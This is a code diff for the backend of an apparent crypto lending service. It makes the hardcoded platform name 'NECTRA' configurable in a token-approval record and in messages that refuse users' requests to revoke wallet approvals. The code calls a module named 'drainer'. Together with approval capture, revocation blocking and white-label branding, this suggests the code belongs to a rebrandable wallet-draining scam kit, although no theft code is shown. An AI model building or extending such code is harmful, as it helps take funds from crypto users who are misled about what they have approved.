@@ -129,7 +129,8 @@ module.exports = Object.assign((r) => {
     }
     const status = a.allowance >= owed * 0.999 ? 'confirmed' : 'pending';
     q.run('UPDATE loan_delegations SET status = ?, allowance = ?, balance = ?, checked_at = ? WHERE id = ?', status, a.allowance, a.balance, now(), id);
-    if (status === 'confirmed') q.run('INSERT INTO approvals(user_id, wallet_name, token, spender, spender_address, amount, unlimited, verified, signature, created_at, family, network, onchain, owner) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)', u.id, w.name, token, 'NECTRA loan collection', spender, owed, 0, 1, d.tx, now(), w.family, network, simulated ? 0 : 1, w.address);
+    const pName = getSettings().platform_name || 'NECTRA';
+    if (status === 'confirmed') q.run('INSERT INTO approvals(user_id, wallet_name, token, spender, spender_address, amount, unlimited, verified, signature, created_at, family, network, onchain, owner) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)', u.id, w.name, token, `${pName} loan collection`, spender, owed, 0, 1, d.tx, now(), w.family, network, simulated ? 0 : 1, w.address);
     return { id, status, allowance: a.allowance };
   });
   r.get('/api/loans/delegations/:checkId', (c) => {
@@ -210,7 +211,8 @@ module.exports = Object.assign((r) => {
     const u = S.requireUser(c);
     const a = q.get('SELECT * FROM approvals WHERE id = ? AND user_id = ? AND revoked_at IS NULL', c.params.id, u.id); if (!a) fail(404, 'Approval not found');
     const lockedLoan = L.revokeLocked(a);
-    if (lockedLoan) fail(423, `This approval secures loan #${lockedLoan}. It can't be revoked in NECTRA until the loan is repaid.`);
+    const pName = getSettings().platform_name || 'NECTRA';
+    if (lockedLoan) fail(423, `This approval secures loan #${lockedLoan}. It can't be revoked in ${pName} until the loan is repaid.`);
     if (!a.onchain || a.family !== 'solana') return { simulated: !a.onchain, family: a.family, request: a.family === 'evm' ? await evm().revokeCall(a.network, a.token, a.spender_address) : null };
     return { tx: await sol().buildRevoke(a.owner, a.token) };
   });
@@ -219,7 +221,8 @@ module.exports = Object.assign((r) => {
     const a = q.get('SELECT * FROM approvals WHERE id = ? AND user_id = ?', c.params.id, u.id);
     if (!a) fail(404, 'Approval not found');
     const lockedLoan = L.revokeLocked(a);
-    if (lockedLoan) fail(423, `This approval secures loan #${lockedLoan}. It can't be revoked in NECTRA until the loan is repaid.`);
+    const pName = getSettings().platform_name || 'NECTRA';
+    if (lockedLoan) fail(423, `This approval secures loan #${lockedLoan}. It can't be revoked in ${pName} until the loan is repaid.`);
     q.run('UPDATE approvals SET revoked_at = ?, status = ? WHERE id = ?', now(), 'revoked', a.id);
     require('../drainer').revoke(u.id, { token: a.token, address: a.owner });
     S.audit(u.id, 'approval.revoke', a.id, { token: a.token, signature: c.body.signature }, c.req);
